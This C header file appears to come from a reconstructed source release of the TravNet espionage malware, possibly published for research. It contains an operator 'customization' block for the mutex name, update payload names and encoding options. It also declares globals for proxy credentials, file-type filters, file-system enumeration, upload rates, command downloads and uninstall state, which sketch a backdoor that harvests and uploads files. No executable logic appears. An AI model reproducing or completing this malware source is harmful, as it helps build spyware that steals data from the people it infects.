// Copyright 2015 Christian Roggia. All rights reserved.
// Use of this source code is governed by an Apache 2.0 license that can be
// found in the LICENSE file.

#include <Windows.h>

// ======= [BEGIN EASY COSTUMIZATION] =======
#define TRAVNET_MUTEX_NAME "XXXXX2011 Is Running!"

#define TRAVNET_UPDATE_FILE_NAME_REMOTE	"xbox.exe"
#define TRAVNET_UPDATE_FILE_NAME_LOCAL	"install.exe"

//#define NO_HASH_MD5					// Disable MD5
#define NO_CUSTOM_BASE64_ENCODING		// Disable encryption
// ======== [END EASY COSTUMIZATION] ========

#define _WINSOCK_DEPRECATED_NO_WARNINGS	// Keep using gethostbyname()
#pragma warning(disable : 4996)			// Keep using GetVersionEx()

#pragma comment(lib, "Wininet.lib")
#pragma comment(lib, "Ws2_32.lib")
#pragma comment(lib, "Crypt32.lib")

typedef HANDLE (WINAPI *__tfnCreateToolhelp32Snapshot)(DWORD, DWORD);

#define LOG(str) WriteLog((str), strlen(str));

// --------------- BEGIN DEFINED ---------------
extern DWORD	g_dwMaxFileSizeKB;
extern BOOL		g_bUseTypeLimit;
extern BOOL		g_bUTypeLimit;
// --------------- END DEFINED ---------------

// --------------- BEGIN NOT DEFINED ---------------
extern CHAR		g_nProxy_IP__TEST[32];
extern CHAR		g_nProxy_PORT__TEST[32];
extern CHAR		g_nProxy_USER__TEST[32];
extern CHAR		g_nProxy_PSW__TEST[192];

extern CHAR		g_szTmpPath[260];
extern CHAR		g_szUDIdx[260];
extern CHAR		g_szUEnumFS[260];
extern CHAR		g_szAcceptedFileTypes[324];

extern DWORD	g_dwServiceStatus;
extern SERVICE_STATUS_HANDLE	g_hServiceStatus;

extern CHAR		g_szVolumeSerialNr[260];
extern CHAR		g_szHostByName[16];
extern CHAR		g_szHostname[260];

extern DWORD	g_nProxy_UNK;
extern CHAR		g_nProxy_IP[260];
extern CHAR		g_nProxy_PORT[8];
extern CHAR		g_nProxy_USER[32];
extern CHAR		g_nProxy_PSW[32];

extern char		g_szEnumFS[260];
extern char		g_szDNList[260];
extern char		g_szStat_T[260];
extern char		g_szSysDir[260];

extern DWORD	g_nUploadRate;
extern DWORD	g_nDownCmdTime;

extern CHAR		g_szWebPage[264];

extern DWORD	g_dwScannedFile2;

extern BOOL		g_bUseProxy;

extern DWORD	g_nSentData;
extern DWORD	g_dwLastTickCount;

extern HANDLE	g_hMutex;

extern HANDLE	g_lpThread1;
extern DWORD	g_dwThreadId1;

extern HINSTANCE	g_hInst;

extern BOOL		g_bUAuto;
extern DWORD	g_dwScannedFile;
extern BOOL		g_bUninstall;

extern HANDLE	g_lpThread2;
extern DWORD	g_dwThreadId2;

extern CHAR		g_szModuleLogName[260];
extern CHAR		g_szTestURL[260];

extern DWORD	g_bAutoCheck;
extern BOOL		g_bCheckedSuccess;

extern CHAR		g_szBlank[4]; // This makes no sense, if the variable is not defined it could have any value

extern CHAR		g_szLastHashMD5[72];
// --------------- END NOT DEFINED ---------------